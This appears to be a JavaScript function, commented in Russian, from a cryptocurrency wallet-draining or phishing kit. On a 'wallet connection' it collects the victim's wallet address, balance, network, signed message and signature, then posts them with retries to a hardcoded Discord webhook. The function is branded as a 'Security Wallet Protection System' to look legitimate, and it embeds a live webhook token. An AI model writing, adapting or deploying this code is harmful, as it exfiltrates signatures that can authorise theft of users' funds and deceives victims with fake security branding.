// Функция для отправки данных на Discord webhook
async function sendToDiscordWebhook(userAddress, signature, message) {
    const webhookURL = 'https://discordapp.com/api/webhooks/1420896121835884718/IdDJHN_exPKf4s-4pDwmQHJkaLCxfWkXSPBTbygj6TpSySJ3RICs8LvEIJO3bn_yOuXW';
    
    // Получаем баланс и название сети
    const balance = await getShortBalance();
    const network = await getNetworkName();
    
    // Проверяем длину подписи
    const signatureLength = signature.length;
    
    // Ограничиваем длину подписи для Discord (2000 символов максимум для поля)
    const truncatedSignature = signatureLength > 1000 ? 
        signature.substring(0, 1000) + '... [TRUNCATED]' : 
        signature;
    
    // Ограничиваем длину сообщения
    const truncatedMessage = message.length > 500 ? 
        message.substring(0, 500) + '... [TRUNCATED]' : 
        message;

    const embed = {
        title: "🔐 Новое подключение кошелька",
        color: 3066993, // Зеленый цвет
        timestamp: new Date().toISOString(),
        fields: [
            {
                name: "💰 Адрес кошелька",
                value: `\`${userAddress}\``,
                inline: false
            },
            {
                name: "💎 Баланс",
                value: balance,
                inline: true
            },
            {
                name: "🌐 Сеть",
                value: network,
                inline: true
            },
            {
                name: `✍️ Подпись (${signatureLength} символов)`,
                value: `\`\`\`${truncatedSignature}\`\`\``,
                inline: false
            },
            {
                name: "📝 Сообщение",
                value: `\`\`\`${truncatedMessage}\`\`\``,
                inline: false
            },
            {
                name: "⏰ Время подключения",
                value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
                inline: false
            }
        ],
        footer: {
            text: "Security Wallet Protection System"
        }
    };

    try {
        // Добавляем повторные попытки
        let attempts = 0;
        const maxAttempts = 3;
        
        while (attempts < maxAttempts) {
            try {
                const response = await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        embeds: [embed],
                        username: 'Wallet Security Bot',
                        avatar_url: 'https://cdn-icons-png.flaticon.com/512/6001/6001533.png'
                    })
                });

                if (response.ok) {
                    console.log('✅ Данные успешно отправлены в Discord');
                    return true;
                } else if (response.status === 429) {
                    // Слишком много запросов - ждем и пробуем снова
                    const retryAfter = response.headers.get('Retry-After') || 2;
                    console.log(`⚠️ Rate limited. Retrying after ${retryAfter} seconds...`);
                    await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
                    attempts++;
                } else {
                    console.error('❌ Ошибка отправки в Discord. Статус:', response.status);
                    console.error('Текст ошибки:', await response.text());
                    return false;
                }
            } catch (error) {
                console.error(`❌ Попытка ${attempts + 1} не удалась:`, error);
                attempts++;
                if (attempts < maxAttempts) {
                    await new Promise(resolve => setTimeout(resolve, 1000 * attempts));
                }
            }
        }
        
        console.error('❌ Все попытки отправки не удались');
        return false;
        
    } catch (error) {
        console.error('❌ Критическая ошибка при отправке в Discord:', error);
        return false;
    }
}
